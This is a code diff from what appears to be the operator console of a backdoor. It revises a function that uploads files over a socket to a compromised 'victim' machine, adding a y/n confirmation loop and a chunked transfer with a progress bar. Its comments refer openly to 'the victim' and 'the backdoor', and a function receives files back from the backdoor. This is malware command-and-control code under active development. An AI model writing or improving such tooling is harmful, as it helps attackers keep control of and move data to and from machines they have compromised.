@@ -29,42 +29,50 @@ def handle_command(client_socket):
  #Upload Function
 def upload_file(client_socket):
 
- #Input the file name
- filename = input("Input the Filename to be uploaded: ")
+    while True:
+         #Input the file name
+         filename = input("Input the Filename to be uploaded: ")
 
 
- if os.path.exists(filename):
-     #Send the file name to the target
-     client_socket.send(filename.encode('utf-8'))
-     # Get the size of the file
-     file_size = os.path.getsize(filename)
+         if os.path.exists(filename):
+             #Send the file name to the target
+             client_socket.send(filename.encode('utf-8'))
+             # Get the size of the file
+             file_size = int(os.path.getsize(filename))
 
-     print(f"Sending file: {filename} of size {file_size} bytes")
+             print(f"Sending file: {filename} of size {file_size} bytes")
 
-     # Send the file size to the victim
-     client_socket.sendall(str(file_size).encode('utf-8'))
+             # Send the file size to the victim
+             client_socket.sendall(str(file_size).encode('utf-8'))
 
-     test = input("Press y to start upload the function: ")
-     client_socket.send(test.encode('utf-8'))
+             while True:
+                 # Send the message to the backdoor in order to tell it start receiving the file
+                 key = input("Start upload the file (y/n)? ")
+                 client_socket.send(key.encode('utf-8'))
+
+                 # If the input is y, start the upload
+                 if key == "y":
 
 
+                     with open(filename, 'rb') as file:
+                         with tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Sending {filename}") as pbar:
+                            while (chunk := file.read(1024)):
+                                 client_socket.sendall(chunk)
+                                 pbar.update(len(chunk))
+                            pbar.close()
 
-     with open(filename, 'rb') as file:
-         bytes_sent = 0
-         chunk = file.read(1024)
-         with tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Sending {filename}") as pbar:
-            while chunk:
-                 client_socket.sendall(chunk)
-                 chunk = file.read(1024)
-                 bytes_sent += len(chunk)
-                 pbar.update(len(chunk))
+                     handle_command(client_socket)
 
-         print(f"File '{filename}' sent successfully. Total bytes sent: {bytes_sent}")
-     handle_command(client_socket)
+                 elif key == "n":
 
- else:
-     print("File not found!")
-     handle_command(client_socket)
+                     print("Exiting upload mode...")
+
+                 else:
+                     print("Invalid input!! y for yes, n for no")
+
+         else:
+             print("File not found!")
+
 
 
 # Function to receive file from the backdoor
